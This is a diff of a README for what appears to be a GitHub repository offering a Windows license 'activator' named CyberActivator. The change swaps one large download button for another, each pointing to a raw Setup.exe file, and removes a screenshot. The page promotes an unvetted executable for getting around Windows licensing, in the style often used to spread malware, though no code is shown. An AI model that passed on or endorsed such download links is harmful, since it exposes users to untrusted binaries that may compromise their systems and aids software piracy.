@@ -32,7 +32,6 @@
   
   <table>
     <tr>
-      <td><img src="img/Screenshot 2026-05-07 080600.png" width="400"> <br> <strong>More Halp</strong></td>
       <td><img src="https://learn-attachment.microsoft.com/api/attachments/9faaf2e3-1d3c-446a-a0a4-c622042b2a0e?platform=QnA" width="400"> <br> <strong>Product Key Problam Error Code: 0xC004F074</strong></td>
     </tr>
   </table>
@@ -52,8 +51,8 @@
 
 ---
 ## Download Now
-  <a href="https://raw.githubusercontent.com/cloudCoder512/Microsoft-Windows-Activator/master/Output/CyberActivator_Setup.exe">
-    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-CyberActivator_Setup.exe-0066FF?style=for-the-badge&logo=windows&logoColor=white" alt="Download" height="60">
+  <a href="https://github.com/cloudCoder512/CyberActivator-Pro/raw/master/Package/CyberActivator%20Setup.exe">
+    <img src="https://img.shields.io/badge/DOWNLOAD-CyberActivator-blue?style=for-the-badge&logo=windows&logoColor=white" height="60">
 </a>
 
 ## Open Live Preview
